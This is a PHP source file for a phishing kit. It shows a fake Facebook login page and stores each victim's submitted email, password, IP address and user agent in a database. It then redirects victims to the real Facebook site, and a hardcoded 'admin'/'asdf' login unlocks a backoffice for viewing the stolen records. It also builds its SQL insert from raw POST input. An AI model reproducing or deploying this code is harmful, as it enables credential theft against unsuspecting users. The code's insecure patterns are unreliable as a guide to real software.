<?php

//require_once 'controller/Backoffice.php';

class Main {

	private static $mail = 'admin';
	private static $pass = 'asdf';

  private $backoffice;

	public function __construct() {
    $this->backoffice = new Backoffice();
  }

 	public function handle() 
  {

    session_start();

    $submit = isset( $_POST['submit'] ) ? $_POST['submit'] : NULL;

    //$firephp->log($submit, 'submit');

    if ( isset($_SESSION['backoffice']) ) {
      $this->backoffice->index();
      return;
    } 

    if ( $submit ) {
      $this->check_credentials();
      return;
    }

    $this->show_input_form();
 	}

  public function check_credentials() 
  {

    $mail = isset( $_POST['mail'] ) ? $_POST['mail'] : NULL;
    $pass = isset( $_POST['pass'] ) ? $_POST['pass'] : NULL;

    // check credentials here ...
    $welcome = ( $mail == self::$mail && $pass == self::$pass );

    if ( $welcome ) {

      $_SESSION['backoffice'] = 'backoffice';
    	$this->backoffice->index();
    }
    else {

    	// store do DB ...
    	$this->store();
    }
  }

	public function show_input_form() {
    include 'view/sites/facebook/index.php';
    //include 'view/sites/input/index.php';
  }

 	public function store() {

 		// store to DB ...
     //$firephp->log($mail, 'mail');

    $mail = $_POST['mail']; 
    $pass = $_POST['pass']; 
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent =  $_SERVER['HTTP_USER_AGENT'];
    $date = date('Y-m-d H:i:s');

    $conn = mysqli_connect(DB_SERVER,DB_USERNAME, DB_PASSWORD, DB_DATABASE);

    if ( $conn === false ) {
      //die("ERROR: Could not connect. " . mysqli_connect_error());
    }

    $query = "INSERT INTO record (mail,pass,ip,user_agent,created) VALUES ('$mail','$pass','$ip','$user_agent','$date')";

    if ( mysqli_query($conn, $query) ) {
      //echo "Records added successfully.";
    } else{
      //echo "ERROR: Could not able to execute $sql. " . mysqli_error($conn);
    }
 
    //$query = "INSERT INTO record (mail,pass,ip,user_agent,created) VALUES (?,?,?,?,?)";
    //$statment = $conn->prepare($query);
    //$statment->bind_param( $_POST['mail'] , $_POST['pass'] , $_SERVER['REMOTE_ADDR'] , $_SERVER['HTTP_USER_AGENT'] , $date );
    //$statment->execute();
    //$statment->close();

    $conn->close();

    /*
    echo $mail;
    echo "<br>";
    echo $pass;
    echo "<br>";
    echo $ip;
    echo "<br>";
    echo $user_agent;
    echo "<br>";
    echo $date;
    echo "<br>";
    */

    //echo $_SERVER['REMOTE_HOST'];
     //$firephp->log($pass, 'pass');

    //$this->show_input_form();

 		// redirect to ...
    header('Location: https://www.facebook.com');

 	}
}

?>
    